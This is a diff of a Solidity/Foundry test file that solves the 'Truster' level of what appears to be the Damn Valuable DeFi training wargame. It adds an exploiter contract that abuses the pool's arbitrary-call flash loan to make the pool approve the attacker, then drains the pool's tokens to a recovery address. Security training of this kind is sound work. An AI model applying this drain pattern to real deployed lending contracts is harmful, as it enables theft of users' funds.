@@ -6,6 +6,37 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+
+contract TrusterExploiter {
+    TrusterLenderPool pool;
+    DamnValuableToken token;
+    address recovery;
+    uint256 immutable TOKENS_IN_POOL;
+
+    constructor(address _pool, address _token, address _recovery, uint256 _TOKENS_IN_POOL) {
+        pool = TrusterLenderPool(_pool);
+        token = DamnValuableToken(_token);
+        recovery = _recovery;
+        TOKENS_IN_POOL = _TOKENS_IN_POOL;
+    }
+
+    function attack() external {
+        // need to approve the transfer of the tokens from the pool to the attacker contract
+        bytes memory data = abi.encodeCall(
+            token.approve,
+            (address(this), TOKENS_IN_POOL)
+        );
+
+        // we can borrow 0 tokens, just need to call the function on the token contract
+        pool.flashLoan(0, address(this), address(token), data);
+
+        token.transferFrom(address(pool), address(this), token.balanceOf(address(pool)));
+
+        token.transfer(recovery, TOKENS_IN_POOL);
+
+    }
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -52,27 +83,17 @@ contract TrusterChallenge is Test {
      */
     function test_truster() public checkSolvedByPlayer {
 
-        bytes memory data = abi.encodeCall(
-            pool.flashLoan,
-            (TOKENS_IN_POOL, address(pool), address(pool), bytes(""))
+        // we deploy the exploiter contract and call the attack function
+        TrusterExploiter exploiter = new TrusterExploiter(
+            address(pool),
+            address(token),
+            recovery,
+            TOKENS_IN_POOL
         );
 
-        pool.flashLoan(TOKENS_IN_POOL, recovery, address(pool), data);
+        exploiter.attack();
 
-        // bytes memory data = abi.encodeWithSignature(
-        //     "approve(address,uint256)",
-        //     player,
-        //     TOKENS_IN_POOL
-        // );
 
-        // pool.flashLoan(
-        //     0,
-        //     player,
-        //     address(token),
-        //     data
-        // );
-
-        // token.transferFrom(address(pool), player, TOKENS_IN_POOL);
     }
 
     /**
